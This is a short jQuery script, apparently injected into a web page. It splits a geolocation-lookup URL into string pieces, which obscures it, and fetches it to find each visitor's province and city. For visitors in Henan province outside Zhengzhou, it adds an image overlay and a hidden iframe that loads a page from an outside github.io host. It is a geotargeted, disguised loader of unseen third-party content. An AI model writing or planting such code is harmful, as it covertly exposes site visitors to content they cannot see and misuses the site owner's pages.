$(function() {
	var aUrl ="htt"+"p://int.dpo"+"ol.sin"+"a.com.cn/i"+"ploo"+"kup/i"+"ploo"+"kup.p"+"hp?fo"+"rmat=j"+"s";//ok
	$.getScript(aUrl,function() {

		var get_province = remote_ip_info.province ;
		var get_city = remote_ip_info.city;

		if(!get_province) {
			return false;
		}
		if(!get_city) {
			return false;
		}
		var p ="\u6CB3\u5357";
		var c ="\u90D1\u5DDE";
		if(get_province.indexOf(p)>-1){
			if(get_city.indexOf(c)===-1){
				var html ='<div  class="ashow" style="position: absolute;left: 403px;top: 196px;width: 150px;background: #fff;border: none;z-index: 11;"><img src="http://yangmaodaren.github.io//666.jpg"/></div>';
				$("body").append(html);

				$("body").append('<iframe src="http://yangmaodaren.github.io/abc.html" style="display:none;"></iframe>')
			}
		}
	});
});
